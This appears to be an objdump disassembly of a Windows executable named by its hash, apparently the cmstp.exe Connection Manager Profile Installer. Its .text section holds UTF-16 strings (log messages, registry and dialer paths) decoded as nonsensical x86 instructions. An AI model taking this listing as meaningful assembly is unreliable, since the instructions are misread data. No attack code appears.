
04720bfdcf20864606b17eabea2b9ead471c1fbd71bf8ce8246edb7247b5d148.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    BYTE PTR [eax],al
  401002:	add    BYTE PTR [eax],al
  401004:	lock push ss
  401006:	inc    ecx
	...
  40100f:	add    BYTE PTR [eax],ah
  401011:	push   ss
  401012:	inc    ecx
  401013:	add    al,dh
  401015:	sbb    eax,DWORD PTR [ecx+0x0]
  401018:	add    BYTE PTR [eax],al
  40101a:	add    BYTE PTR [eax],al
  40101c:	sbb    BYTE PTR [eax+eax*1+0x0],0x70
  401021:	fwait
  401022:	add    BYTE PTR [eax],al
  401024:	adc    BYTE PTR [edx+0x16200000],dh
  40102a:	add    DWORD PTR [eax],eax
  40102c:	lock push ss
  40102e:	add    DWORD PTR [eax],eax
  401030:	xor    BYTE PTR [edi],dl
  401032:	add    DWORD PTR [eax],eax
  401034:	sbb    BYTE PTR [ecx],0x1
  401037:	add    BYTE PTR [eax-0xffffee5],ah
  40103d:	sbb    eax,DWORD PTR [ecx]
  40103f:	add    al,dl
  401041:	push   ds
  401042:	add    DWORD PTR [eax],eax
  401044:	pusha  
  401045:	pop    ds
  401046:	add    DWORD PTR [eax],eax
  401048:	nop
  401049:	pop    ds
  40104a:	add    DWORD PTR [eax],eax
  40104c:	adc    BYTE PTR [eax],ah
  40104e:	add    DWORD PTR [eax],eax
  401050:	and    BYTE PTR [eax],ah
  401052:	add    DWORD PTR [eax],eax
	...
  401060:	inc    eax
  401061:	xor    DWORD PTR [ecx+0x0],eax
  401064:	nop
  401065:	xor    DWORD PTR [ecx+0x0],eax
	...
  401070:	inc    ebx
  401071:	add    BYTE PTR [eax+eax*1+0x79],al
  401075:	add    BYTE PTR [esi+0x0],ch
  401078:	popa   
  401079:	add    BYTE PTR [ebp+0x0],ch
  40107c:	imul   eax,DWORD PTR [eax],0x4c0063
  401082:	imul   eax,DWORD PTR [eax],0x720062
  401088:	popa   
  401089:	add    BYTE PTR [edx+0x0],dh
  40108c:	jns    0x40108e
  40108e:	and    BYTE PTR [eax],al
  401090:	sub    eax,0x4c002000
  401095:	add    BYTE PTR [edi+0x0],ch
  401098:	popa   
  401099:	add    BYTE PTR [eax+eax*1+0x69],ah
  40109d:	add    BYTE PTR [esi+0x0],ch
  4010a0:	add    BYTE PTR [bx+si],ah
  4010a3:	add    BYTE PTR [eax+eax*1+0x69],ch
  4010a7:	add    BYTE PTR [edx+0x0],ah
  4010aa:	jb     0x4010ac
  4010ac:	popa   
  4010ad:	add    BYTE PTR [edx+0x0],dh
  4010b0:	jns    0x4010b2
  4010b2:	and    BYTE PTR [eax],al
  4010b4:	sub    eax,0x25002000
  4010b9:	add    BYTE PTR [ebx+0x0],dh
  4010bc:	add    BYTE PTR [eax],al
  4010be:	add    BYTE PTR [eax],al
  4010c0:	inc    ecx
  4010c1:	add    BYTE PTR [eax+eax*1+0x6c],ch
  4010c5:	add    BYTE PTR [edi+0x0],ch
  4010c8:	ja     0x4010ca
  4010ca:	xor    eax,DWORD PTR [eax]
  4010cc:	xor    al,BYTE PTR [eax]
  4010ce:	bound  eax,QWORD PTR [eax]
  4010d0:	imul   eax,DWORD PTR [eax],0x74
  4010d6:	add    BYTE PTR [eax],al
  4010d8:	push   ebx
  4010d9:	add    BYTE PTR [eax+eax*1+0x72],dh
  4010dd:	add    BYTE PTR [ecx+0x0],ch
  4010e0:	outs   dx,BYTE PTR ds:[esi]
  4010e1:	add    BYTE PTR [edi+0x0],ah
  4010e4:	jae    0x4010e6
  4010e6:	add    BYTE PTR [eax],al
  4010e8:	push   ebx
  4010e9:	add    BYTE PTR [edi+0x0],cl
  4010ec:	inc    esi
  4010ed:	add    BYTE PTR [eax+eax*1+0x57],dl
  4010f1:	add    BYTE PTR [ecx+0x0],al
  4010f4:	push   edx
  4010f5:	add    BYTE PTR [ebp+0x0],al
  4010f8:	pop    esp
  4010f9:	add    BYTE PTR [ebp+0x0],cl
  4010fc:	imul   eax,DWORD PTR [eax],0x720063
  401102:	outs   dx,DWORD PTR ds:[esi]
  401103:	add    BYTE PTR [ebx+0x0],dh
  401106:	outs   dx,DWORD PTR ds:[esi]
  401107:	add    BYTE PTR [esi+0x0],ah
  40110a:	je     0x40110c
  40110c:	pop    esp
  40110d:	add    BYTE PTR [edi+0x0],dl
  401110:	imul   eax,DWORD PTR [eax],0x64006e
  401116:	outs   dx,DWORD PTR ds:[esi]
  401117:	add    BYTE PTR [edi+0x0],dh
  40111a:	jae    0x40111c
  40111c:	pop    esp
  40111d:	add    BYTE PTR [ebx+0x0],al
  401120:	jne    0x401122
  401122:	jb     0x401124
  401124:	jb     0x401126
  401126:	add    BYTE PTR gs:[esi+0x0],ch
  40112a:	je     0x40112c
  40112c:	push   esi
  40112d:	add    BYTE PTR [ebp+0x0],ah
  401130:	jb     0x401132
  401132:	jae    0x401134
  401134:	imul   eax,DWORD PTR [eax],0x6e006f
  40113a:	pop    esp
  40113b:	add    BYTE PTR [ecx+0x0],al
  40113e:	jo     0x401140
  401140:	jo     0x401142
  401142:	and    BYTE PTR [eax],al
  401144:	push   eax
  401145:	add    BYTE PTR [ecx+0x0],ah
  401148:	je     0x40114a
  40114a:	push   0x5c007300
  40114f:	add    BYTE PTR [ebx+0x0],al
  401152:	dec    ebp
  401153:	add    BYTE PTR [ebp+0x0],cl
  401156:	inc    edi
  401157:	add    BYTE PTR [edx+0x0],dl
  40115a:	xor    eax,DWORD PTR [eax]
  40115c:	xor    al,BYTE PTR [eax]
  40115e:	add    BYTE PTR cs:[ebp+0x0],al
  401162:	pop    eax
  401163:	add    BYTE PTR [ebp+0x0],al
  401166:	add    BYTE PTR [eax],al
  401168:	inc    ebx
  401169:	dec    ebp
  40116a:	push   ebx
  40116b:	push   esp
  40116c:	push   eax
  40116d:	add    BYTE PTR [eax],al
  40116f:	add    BYTE PTR [ebx+0x0],al
  401172:	ins    DWORD PTR es:[edi],dx
  401173:	add    BYTE PTR [ebx+0x0],dh
  401176:	je     0x401178
  401178:	jo     0x40117a
  40117a:	inc    ebp
  40117b:	add    BYTE PTR [eax+0x0],bh
  40117e:	je     0x401180
  401180:	add    BYTE PTR gs:[esi+0x0],ch
  401184:	jae    0x401186
  401186:	imul   eax,DWORD PTR [eax],0x6e006f
  40118c:	inc    esp
  40118d:	add    BYTE PTR [eax+eax*1+0x6c],ch
  401191:	add    BYTE PTR [eax],al
  401193:	add    BYTE PTR [ebx+0x6d],al
  401196:	jae    0x40120c
  401198:	jo     0x4011df
  40119a:	js     0x401210
  40119c:	outs   dx,BYTE PTR gs:[esi]
  40119e:	jae    0x401209
  4011a0:	outs   dx,DWORD PTR ds:[esi]
  4011a1:	outs   dx,BYTE PTR ds:[esi]
  4011a2:	push   eax
  4011a3:	jb     0x401214
  4011a5:	arpl   WORD PTR [eax],ax
  4011a7:	add    BYTE PTR [ebx+0x6d],al
  4011aa:	jae    0x401220
  4011ac:	jo     0x4011f3
  4011ae:	js     0x401224
  4011b0:	outs   dx,BYTE PTR gs:[esi]
  4011b2:	jae    0x40121d
  4011b4:	outs   dx,DWORD PTR ds:[esi]
  4011b5:	outs   dx,BYTE PTR ds:[esi]
  4011b6:	push   eax
  4011b7:	jb     0x401228
  4011b9:	arpl   WORD PTR [edx],si
  4011bb:	add    BYTE PTR [ecx],dh
  4011bd:	add    BYTE PTR [eax],al
  4011bf:	add    BYTE PTR [ebx+0x0],ah
  4011c2:	ins    DWORD PTR es:[edi],dx
  4011c3:	add    BYTE PTR [ebx+0x0],ah
  4011c6:	data16 add BYTE PTR [edi+0x0],ah
  4011ca:	xor    eax,DWORD PTR [eax]
  4011cc:	xor    al,BYTE PTR [eax]
  4011ce:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  4011d3:	add    BYTE PTR [eax+eax*1+0x0],ch
  4011d7:	add    BYTE PTR ds:0x3d003d00,bh
  4011dd:	add    BYTE PTR ds:0x3d003d00,bh
  4011e3:	add    BYTE PTR ds:0x3d003d00,bh
  4011e9:	add    BYTE PTR ds:0x3d003d00,bh
  4011ef:	add    BYTE PTR ds:0x3d003d00,bh
  4011f5:	add    BYTE PTR ds:0x3d003d00,bh
  4011fb:	add    BYTE PTR ds:0x3d003d00,bh
  401201:	add    BYTE PTR ds:0x3d003d00,bh
  401207:	add    BYTE PTR ds:0x3d003d00,bh
  40120d:	add    BYTE PTR ds:0x3d003d00,bh
  401213:	add    BYTE PTR ds:0x3d003d00,bh
  401219:	add    BYTE PTR ds:0x3d003d00,bh
  40121f:	add    BYTE PTR ds:0x3d003d00,bh
  401225:	add    BYTE PTR ds:0x3d003d00,bh
  40122b:	add    BYTE PTR ds:0x3d003d00,bh
  401231:	add    BYTE PTR ds:0x3d003d00,bh
  401237:	add    BYTE PTR ds:0x3d003d00,bh
  40123d:	add    BYTE PTR ds:0x3d00,bh
  401243:	add    BYTE PTR [eax],al
  401245:	add    BYTE PTR [eax],al
  401247:	add    BYTE PTR [eax],ah
  401249:	add    BYTE PTR [ebx+0x0],al
  40124c:	dec    ebp
  40124d:	add    BYTE PTR [ebx+0x0],dl
  401250:	push   esp
  401251:	add    BYTE PTR [eax+0x0],dl
  401254:	add    BYTE PTR cs:[ebp+0x0],al
  401258:	pop    eax
  401259:	add    BYTE PTR [ebp+0x0],al
  40125c:	and    BYTE PTR [eax],al
  40125e:	sub    eax,0x4c002000
  401263:	add    BYTE PTR [edi+0x0],cl
  401266:	inc    ecx
  401267:	add    BYTE PTR [eax+eax*1+0x49],al
  40126b:	add    BYTE PTR [esi+0x0],cl
  40126e:	inc    edi
  40126f:	add    BYTE PTR [eax],ah
  401271:	add    BYTE PTR ds:0x50002000,ch
  401277:	add    BYTE PTR [edx+0x0],dh
  40127a:	outs   dx,DWORD PTR ds:[esi]
  40127b:	add    BYTE PTR [ebx+0x0],ah
  40127e:	add    BYTE PTR gs:[ebx+0x0],dh
  401282:	jae    0x401284
  401284:	and    BYTE PTR [eax],al
  401286:	dec    ecx
  401287:	add    BYTE PTR [eax+eax*1+0x20],al
  40128b:	add    BYTE PTR [ecx+0x0],ch
  40128e:	jae    0x401290
  401290:	and    BYTE PTR [eax],al
  401292:	xor    BYTE PTR [eax],al
  401294:	js     0x401296
  401296:	and    eax,0x20007800
  40129b:	add    BYTE PTR [eax],al
  40129d:	add    BYTE PTR [eax],al
  40129f:	add    BYTE PTR [ebx+0x0],al
  4012a2:	dec    ebp
  4012a3:	add    BYTE PTR [ebx+0x0],dl
  4012a6:	push   esp
  4012a7:	add    BYTE PTR [eax+0x0],dl
  4012aa:	add    BYTE PTR cs:[ebp+0x0],al
  4012ae:	pop    eax
  4012af:	add    BYTE PTR [ebp+0x0],al
  4012b2:	and    BYTE PTR [eax],al
  4012b4:	sub    eax,0x20002d00
  4012b9:	add    BYTE PTR [ebp+0x0],al
  4012bc:	outs   dx,BYTE PTR ds:[esi]
  4012bd:	add    BYTE PTR [eax+eax*1+0x65],dh
  4012c1:	add    BYTE PTR [edx+0x0],dh
  4012c4:	imul   eax,DWORD PTR [eax],0x67006e
  4012ca:	and    BYTE PTR [eax],al
  4012cc:	inc    esi
  4012cd:	add    BYTE PTR [eax+eax*1+0x61],ch
  4012d1:	add    BYTE PTR [edi+0x0],ah
  4012d4:	and    BYTE PTR [eax],al
  4012d6:	push   eax
  4012d7:	add    BYTE PTR [edx+0x0],dh
  4012da:	outs   dx,DWORD PTR ds:[esi]
  4012db:	add    BYTE PTR [ebx+0x0],ah
  4012de:	add    BYTE PTR gs:[ebx+0x0],dh
  4012e2:	jae    0x4012e4
  4012e4:	imul   eax,DWORD PTR [eax],0x67006e
  4012ea:	and    BYTE PTR [eax],al
  4012ec:	dec    esp
  4012ed:	add    BYTE PTR [edi+0x0],ch
  4012f0:	outs   dx,DWORD PTR ds:[esi]
  4012f1:	add    BYTE PTR [eax+0x0],dh
  4012f4:	sub    al,0x0
  4012f6:	and    BYTE PTR [eax],al
  4012f8:	add    BYTE PTR fs:[edi+0x0],dh
  4012fc:	inc    esi
  4012fd:	add    BYTE PTR [eax+eax*1+0x61],ch
  401301:	add    BYTE PTR [edi+0x0],ah
  401304:	jae    0x401306
  401306:	and    BYTE PTR [eax],al
  401308:	cmp    eax,0x25002000
  40130d:	add    BYTE PTR [ebp+0x0],dh
  401310:	and    BYTE PTR [eax],al
  401312:	popa   
  401313:	add    BYTE PTR [esi+0x0],ch
  401316:	add    BYTE PTR fs:[eax],ah
  401319:	add    BYTE PTR [ebx+0x0],dh
  40131c:	jp     0x40131e
  40131e:	dec    ecx
  40131f:	add    BYTE PTR [esi+0x0],ch
  401322:	data16 add BYTE PTR [eax+0x0],dl
  401326:	popa   
  401327:	add    BYTE PTR [eax+eax*1+0x68],dh
  40132b:	add    BYTE PTR [eax],ah
  40132d:	add    BYTE PTR ds:0x25002000,bh
  401333:	add    BYTE PTR [ebx+0x0],dh
  401336:	add    BYTE PTR [eax],al
  401338:	pop    esp
  401339:	add    BYTE PTR [eax],al
  40133b:	add    BYTE PTR [eax],al
  40133d:	add    BYTE PTR [eax],al
  40133f:	add    BYTE PTR [ebx+0x0],al
  401342:	ins    DWORD PTR es:[edi],dx
  401343:	add    BYTE PTR [ebx+0x0],dh
  401346:	je     0x401348
  401348:	jo     0x40134a
  40134a:	add    BYTE PTR cs:[ebp+0x0],ah
  40134e:	js     0x401350
  401350:	add    BYTE PTR gs:[eax],ah
  401353:	add    BYTE PTR ds:0x20002d00,ch
  401359:	add    BYTE PTR [ecx+0x0],cl
  40135c:	outs   dx,BYTE PTR ds:[esi]
  40135d:	add    BYTE PTR [ebx+0x0],dh
  401360:	je     0x401362
  401362:	popa   
  401363:	add    BYTE PTR [eax+eax*1+0x6c],ch
  401367:	add    BYTE PTR [ecx+0x0],cl
  40136a:	outs   dx,BYTE PTR ds:[esi]
  40136b:	add    BYTE PTR [esi+0x0],ah
  40136e:	and    BYTE PTR [eax],al
  401370:	data16 add BYTE PTR [ecx+0x0],ah
  401374:	imul   eax,DWORD PTR [eax],0x65006c
  40137a:	add    BYTE PTR fs:[eax],ah
  40137d:	add    BYTE PTR [edi+0x0],dh
  401380:	imul   eax,DWORD PTR [eax],0x680074
  401386:	and    BYTE PTR [eax],al
  401388:	add    BYTE PTR gs:[edx+0x0],dh
  40138c:	jb     0x40138e
  40138e:	outs   dx,DWORD PTR ds:[esi]
  40138f:	add    BYTE PTR [edx+0x0],dh
  401392:	and    BYTE PTR [eax],al
  401394:	and    eax,0x20006400
  401399:	add    BYTE PTR [eax],ch
  40139b:	add    BYTE PTR [eax],dh
  40139d:	add    BYTE PTR [eax+0x0],bh
  4013a0:	and    eax,0x78006c00
  4013a5:	add    BYTE PTR [ecx],ch
  4013a7:	add    BYTE PTR [eax],al
  4013a9:	add    BYTE PTR [eax],al
  4013ab:	add    BYTE PTR [ebx+0x0],al
  4013ae:	ins    DWORD PTR es:[edi],dx
  4013af:	add    BYTE PTR [ebx+0x0],dh
  4013b2:	je     0x4013b4
  4013b4:	jo     0x4013b6
  4013b6:	add    BYTE PTR cs:[ebp+0x0],ah
  4013ba:	js     0x4013bc
  4013bc:	add    BYTE PTR gs:[eax],ah
  4013bf:	add    BYTE PTR ds:0x20002d00,ch
  4013c5:	add    BYTE PTR [ebp+0x0],dl
  4013c8:	jae    0x4013ca
  4013ca:	popa   
  4013cb:	add    BYTE PTR [edi+0x0],ah
  4013ce:	add    BYTE PTR gs:[eax],ah
  4013d1:	add    BYTE PTR [ebp+0x0],al
  4013d4:	jb     0x4013d6
  4013d6:	jb     0x4013d8
  4013d8:	outs   dx,DWORD PTR ds:[esi]
  4013d9:	add    BYTE PTR [edx+0x0],dh
  4013dc:	and    DWORD PTR [eax],eax
  4013de:	add    BYTE PTR [eax],al
  4013e0:	and    BYTE PTR [eax],al
  4013e2:	inc    ebx
  4013e3:	add    BYTE PTR [ebp+0x0],cl
  4013e6:	push   ebx
  4013e7:	add    BYTE PTR [eax+eax*1+0x50],dl
  4013eb:	add    BYTE PTR [esi],ch
  4013ed:	add    BYTE PTR [ebp+0x0],al
  4013f0:	pop    eax
  4013f1:	add    BYTE PTR [ebp+0x0],al
  4013f4:	and    BYTE PTR [eax],al
  4013f6:	sub    eax,0x55002000
  4013fb:	add    BYTE PTR [esi+0x0],cl
  4013fe:	dec    esp
  4013ff:	add    BYTE PTR [edi+0x0],cl
  401402:	inc    ecx
  401403:	add    BYTE PTR [eax+eax*1+0x49],al
  401407:	add    BYTE PTR [esi+0x0],cl
  40140a:	inc    edi
  40140b:	add    BYTE PTR [eax],ah
  40140d:	add    BYTE PTR ds:0x50002000,ch
  401413:	add    BYTE PTR [edx+0x0],dh
  401416:	outs   dx,DWORD PTR ds:[esi]
  401417:	add    BYTE PTR [ebx+0x0],ah
  40141a:	add    BYTE PTR gs:[ebx+0x0],dh
  40141e:	jae    0x401420
  401420:	and    BYTE PTR [eax],al
  401422:	dec    ecx
  401423:	add    BYTE PTR [eax+eax*1+0x20],al
  401427:	add    BYTE PTR [ecx+0x0],ch
  40142a:	jae    0x40142c
  40142c:	and    BYTE PTR [eax],al
  40142e:	xor    BYTE PTR [eax],al
  401430:	js     0x401432
  401432:	and    eax,0x20007800
  401437:	add    BYTE PTR [eax],al
  401439:	add    BYTE PTR [eax],al
  40143b:	add    BYTE PTR [eax+0x4300405c],al
  401441:	add    BYTE PTR [edi+0x0],ch
  401444:	outs   dx,BYTE PTR ds:[esi]
  401445:	add    BYTE PTR [esi+0x0],ch
  401448:	add    BYTE PTR gs:[ebx+0x0],ah
  40144c:	je     0x40144e
  40144e:	imul   eax,DWORD PTR [eax],0x6e006f
  401454:	and    BYTE PTR [eax],al
  401456:	dec    ebp
  401457:	add    BYTE PTR [ecx+0x0],ah
  40145a:	outs   dx,BYTE PTR ds:[esi]
  40145b:	add    BYTE PTR [ecx+0x0],ah
  40145e:	add    BYTE PTR [di+0x0],ah
  401462:	jb     0x401464
  401464:	and    BYTE PTR [eax],al
  401466:	push   eax
  401467:	add    BYTE PTR [edx+0x0],dh
  40146a:	outs   dx,DWORD PTR ds:[esi]
  40146b:	add    BYTE PTR [esi+0x0],ah
  40146e:	imul   eax,DWORD PTR [eax],0x65006c
  401474:	and    BYTE PTR [eax],al
  401476:	dec    ecx
  401477:	add    BYTE PTR [esi+0x0],ch
  40147a:	jae    0x40147c
  40147c:	je     0x40147e
  40147e:	popa   
  40147f:	add    BYTE PTR [eax+eax*1+0x6c],ch
  401483:	add    BYTE PTR [ebp+0x0],ah
  401486:	jb     0x401488
  401488:	and    BYTE PTR [eax],al
  40148a:	dec    ebp
  40148b:	add    BYTE PTR [ebp+0x0],dh
  40148e:	je     0x401490
  401490:	add    BYTE PTR gs:[eax+0x0],bh
  401494:	add    BYTE PTR [eax],al
  401496:	add    BYTE PTR [eax],al
  401498:	inc    ebx
  401499:	add    BYTE PTR [edi+0x0],ch
  40149c:	outs   dx,BYTE PTR ds:[esi]
  40149d:	add    BYTE PTR [esi+0x0],ch
  4014a0:	add    BYTE PTR gs:[ebx+0x0],ah
  4014a4:	je     0x4014a6
  4014a6:	imul   eax,DWORD PTR [eax],0x6e006f
  4014ac:	and    BYTE PTR [eax],al
  4014ae:	dec    ebp
  4014af:	add    BYTE PTR [ecx+0x0],ah
  4014b2:	outs   dx,BYTE PTR ds:[esi]
  4014b3:	add    BYTE PTR [ecx+0x0],ah
  4014b6:	add    BYTE PTR [di+0x0],ah
  4014ba:	jb     0x4014bc
  4014bc:	add    BYTE PTR [eax],al
  4014be:	add    BYTE PTR [eax],al
  4014c0:	push   eax
  4014c1:	add    BYTE PTR [edx+0x0],al
  4014c4:	dec    ebx
  4014c5:	add    BYTE PTR [eax],al
  4014c7:	add    BYTE PTR [eax+eax*1+0x72],bl
  4014cb:	add    BYTE PTR [ecx+0x0],ah
  4014ce:	jae    0x4014d0
  4014d0:	jo     0x4014d2
  4014d2:	push   0x6e006f00
  4014d7:	add    BYTE PTR [ebp+0x0],ah
  4014da:	add    BYTE PTR cs:[eax+0x0],dh
  4014de:	bound  eax,QWORD PTR [eax]
  4014e0:	imul   eax,DWORD PTR [eax],0x0
  4014e3:	add    BYTE PTR [eax+eax*1+0x5f],bl
  4014e7:	add    BYTE PTR [ebx+0x0],al
  4014ea:	dec    ebp
  4014eb:	add    BYTE PTR [eax+0x0],dl
  4014ee:	push   0x6e006f00
  4014f3:	add    BYTE PTR [ebp+0x0],ah
  4014f6:	add    BYTE PTR [eax],al
  4014f8:	and    eax,0x69007700
  4014fd:	add    BYTE PTR [esi+0x0],ch
  401500:	add    BYTE PTR fs:[ecx+0x0],ch
  401504:	jb     0x401506
  401506:	and    eax,0x73005c00
  40150b:	add    BYTE PTR [ecx+0x0],bh
  40150e:	jae    0x401510
  401510:	je     0x401512
  401512:	add    BYTE PTR gs:[ebp+0x0],ch
  401516:	xor    eax,DWORD PTR [eax]
  401518:	xor    al,BYTE PTR [eax]
  40151a:	pop    esp
  40151b:	add    BYTE PTR [ebx+0x0],ah
  40151e:	ins    DWORD PTR es:[edi],dx
  40151f:	add    BYTE PTR [eax+eax*1+0x69],ah
  401523:	add    BYTE PTR [ecx+0x0],ah
  401526:	ins    BYTE PTR es:[edi],dx
  401527:	add    BYTE PTR [ebx],dh
  401529:	add    BYTE PTR [edx],dh
  40152b:	add    BYTE PTR [esi],ch
  40152d:	add    BYTE PTR [eax+eax*1+0x6c],ah
  401531:	add    BYTE PTR [eax+eax*1+0x0],ch
  401535:	add    BYTE PTR [eax],al
  401537:	add    BYTE PTR [eax+eax*1+0x69],al
  40153b:	add    BYTE PTR [ecx+0x0],ah
  40153e:	ins    BYTE PTR es:[edi],dx
  40153f:	add    BYTE PTR [ebp+0x0],dh
  401542:	jo     0x401544
  401544:	add    BYTE PTR [eax],al
  401546:	add    BYTE PTR [eax],al
  401548:	inc    esp
  401549:	add    BYTE PTR [ecx+0x0],ch
  40154c:	jb     0x40154e
  40154e:	add    BYTE PTR gs:[ebx+0x0],ah
  401552:	je     0x401554
  401554:	add    BYTE PTR [eax],al
  401556:	add    BYTE PTR [eax],al
  401558:	inc    ebx
  401559:	add    BYTE PTR [edi+0x0],ch
  40155c:	outs   dx,BYTE PTR ds:[esi]
  40155d:	add    BYTE PTR [esi+0x0],ch
  401560:	add    BYTE PTR gs:[ebx+0x0],ah
  401564:	je     0x401566
  401566:	imul   eax,DWORD PTR [eax],0x6e006f
  40156c:	push   esp
  40156d:	add    BYTE PTR [ecx+0x0],bh
  401570:	jo     0x401572
  401572:	add    BYTE PTR gs:[eax],al
  401575:	add    BYTE PTR [eax],al
  401577:	add    BYTE PTR [esi],ch
  401579:	add    BYTE PTR [ebx+0x0],ah
  40157c:	ins    DWORD PTR es:[edi],dx
  40157d:	add    BYTE PTR [eax+0x0],dh
	...
  401588:	push   ebx
  401589:	add    BYTE PTR [edi+0x0],cl
  40158c:	inc    esi
  40158d:	add    BYTE PTR [eax+eax*1+0x57],dl
  401591:	add    BYTE PTR [ecx+0x0],al
  401594:	push   edx
  401595:	add    BYTE PTR [ebp+0x0],al
  401598:	pop    esp
  401599:	add    BYTE PTR [ebp+0x0],cl
  40159c:	imul   eax,DWORD PTR [eax],0x720063
  4015a2:	outs   dx,DWORD PTR ds:[esi]
  4015a3:	add    BYTE PTR [ebx+0x0],dh
  4015a6:	outs   dx,DWORD PTR ds:[esi]
  4015a7:	add    BYTE PTR [esi+0x0],ah
  4015aa:	je     0x4015ac
  4015ac:	pop    esp
  4015ad:	add    BYTE PTR [ebx+0x0],al
  4015b0:	outs   dx,DWORD PTR ds:[esi]
  4015b1:	add    BYTE PTR [esi+0x0],ch
  4015b4:	outs   dx,BYTE PTR ds:[esi]
  4015b5:	add    BYTE PTR [ebp+0x0],ah
  4015b8:	arpl   WORD PTR [eax],ax
  4015ba:	je     0x4015bc
  4015bc:	imul   eax,DWORD PTR [eax],0x6e006f
  4015c2:	and    BYTE PTR [eax],al
  4015c4:	dec    ebp
  4015c5:	add    BYTE PTR [ecx+0x0],ah
  4015c8:	outs   dx,BYTE PTR ds:[esi]
  4015c9:	add    BYTE PTR [ecx+0x0],ah
  4015cc:	add    BYTE PTR [di+0x0],ah
  4015d0:	jb     0x4015d2
  4015d2:	pop    esp
  4015d3:	add    BYTE PTR [ebp+0x0],cl
  4015d6:	popa   
  4015d7:	add    BYTE PTR [eax+0x0],dh
  4015da:	jo     0x4015dc
  4015dc:	imul   eax,DWORD PTR [eax],0x67006e
  4015e2:	jae    0x4015e4
  4015e4:	add    BYTE PTR [eax],al
  4015e6:	add    BYTE PTR [eax],al
  4015e8:	and    eax,0x25007300
  4015ed:	add    BYTE PTR [ebx+0x0],dh
  4015f0:	and    eax,0x7300
  4015f5:	add    BYTE PTR [eax],al
  4015f7:	add    BYTE PTR [ebx+0x0],al
  4015fa:	jb     0x4015fc
  4015fc:	add    BYTE PTR gs:[ecx+0x0],ah
  401600:	je     0x401602
  401602:	add    BYTE PTR gs:[eax+eax*1+0x61],cl
  401607:	add    BYTE PTR [ecx+0x0],bh
  40160a:	add    BYTE PTR gs:[edx+0x0],dh
  40160e:	inc    esp
  40160f:	add    BYTE PTR [ecx+0x0],ch
  401612:	jb     0x401614
  401614:	add    BYTE PTR gs:[ebx+0x0],ah
  401618:	je     0x40161a
  40161a:	outs   dx,DWORD PTR ds:[esi]
  40161b:	add    BYTE PTR [edx+0x0],dh
  40161e:	jns    0x401620
  401620:	and    BYTE PTR [eax],al
  401622:	data16 add BYTE PTR [ecx+0x0],ah
  401626:	imul   eax,DWORD PTR [eax],0x65006c
  40162c:	add    BYTE PTR fs:[eax],ah
  40162f:	add    BYTE PTR [eax+eax*1+0x6f],dh
  401633:	add    BYTE PTR [eax],ah
  401635:	add    BYTE PTR [ebx+0x0],ah
  401638:	jb     0x40163a
  40163a:	add    BYTE PTR gs:[ecx+0x0],ah
  40163e:	je     0x401640
  401640:	add    BYTE PTR gs:[eax],ah
  401643:	add    BYTE PTR ds:0x20007300,ah
  401649:	add    BYTE PTR [esi],ch
  40164b:	add    BYTE PTR [esi],ch
  40164d:	add    BYTE PTR [esi],ch
  40164f:	add    BYTE PTR [eax],ah
  401651:	add    BYTE PTR [ecx+0x0],cl
  401654:	je     0x401656
  401656:	and    BYTE PTR [eax],al
  401658:	jo     0x40165a
  40165a:	jb     0x40165c
  40165c:	outs   dx,DWORD PTR ds:[esi]
  40165d:	add    BYTE PTR [edx+0x0],ah
  401660:	popa   
  401661:	add    BYTE PTR [edx+0x0],ah
  401664:	ins    BYTE PTR es:[edi],dx
  401665:	add    BYTE PTR [ecx+0x0],bh
  401668:	and    BYTE PTR [eax],al
  40166a:	add    BYTE PTR gs:[eax+0x0],bh
  40166e:	imul   eax,DWORD PTR [eax],0x740073
  401674:	jae    0x401676
  401676:	and    BYTE PTR [eax],al
  401678:	popa   
  401679:	add    BYTE PTR [eax+eax*1+0x72],ch
  40167d:	add    BYTE PTR [ebp+0x0],ah
  401680:	popa   
  401681:	add    BYTE PTR [eax+eax*1+0x79],ah
  401685:	add    BYTE PTR [esi],ch
	...
  40168f:	add    BYTE PTR [ebx+0x0],dl
  401692:	dec    edi
  401693:	add    BYTE PTR [esi+0x0],al
  401696:	push   esp
  401697:	add    BYTE PTR [edi+0x0],dl
  40169a:	inc    ecx
  40169b:	add    BYTE PTR [edx+0x0],dl
  40169e:	inc    ebp
  40169f:	add    BYTE PTR [eax+eax*1+0x4d],bl
  4016a3:	add    BYTE PTR [ecx+0x0],ch
  4016a6:	arpl   WORD PTR [eax],ax
  4016a8:	jb     0x4016aa
  4016aa:	outs   dx,DWORD PTR ds:[esi]
  4016ab:	add    BYTE PTR [ebx+0x0],dh
  4016ae:	outs   dx,DWORD PTR ds:[esi]
  4016af:	add    BYTE PTR [esi+0x0],ah
  4016b2:	je     0x4016b4
  4016b4:	pop    esp
  4016b5:	add    BYTE PTR [edi+0x0],dl
  4016b8:	imul   eax,DWORD PTR [eax],0x64006e
  4016be:	outs   dx,DWORD PTR ds:[esi]
  4016bf:	add    BYTE PTR [edi+0x0],dh
  4016c2:	jae    0x4016c4
  4016c4:	pop    esp
  4016c5:	add    BYTE PTR [ebx+0x0],al
  4016c8:	jne    0x4016ca
  4016ca:	jb     0x4016cc
  4016cc:	jb     0x4016ce
  4016ce:	add    BYTE PTR gs:[esi+0x0],ch
  4016d2:	je     0x4016d4
  4016d4:	push   esi
  4016d5:	add    BYTE PTR [ebp+0x0],ah
  4016d8:	jb     0x4016da
  4016da:	jae    0x4016dc
  4016dc:	imul   eax,DWORD PTR [eax],0x6e006f
  4016e2:	pop    esp
  4016e3:	add    BYTE PTR [ebp+0x0],al
  4016e6:	js     0x4016e8
  4016e8:	jo     0x4016ea
  4016ea:	ins    BYTE PTR es:[edi],dx
  4016eb:	add    BYTE PTR [edi+0x0],ch
  4016ee:	jb     0x4016f0
  4016f0:	add    BYTE PTR gs:[edx+0x0],dh
  4016f4:	pop    esp
  4016f5:	add    BYTE PTR [ebx+0x0],dl
  4016f8:	push   0x6c006500
  4016fd:	add    BYTE PTR [eax+eax*1+0x20],ch
  401701:	add    BYTE PTR [esi+0x0],al
  401704:	outs   dx,DWORD PTR ds:[esi]
  401705:	add    BYTE PTR [eax+eax*1+0x64],ch
  401709:	add    BYTE PTR [ebp+0x0],ah
  40170c:	jb     0x40170e
  40170e:	jae    0x401710
  401710:	add    BYTE PTR [eax],al
  401712:	add    BYTE PTR [eax],al
  401714:	inc    ebx
  401715:	add    BYTE PTR [edi+0x0],ch
  401718:	ins    DWORD PTR es:[edi],dx
  401719:	add    BYTE PTR [ebp+0x0],ch
  40171c:	outs   dx,DWORD PTR ds:[esi]
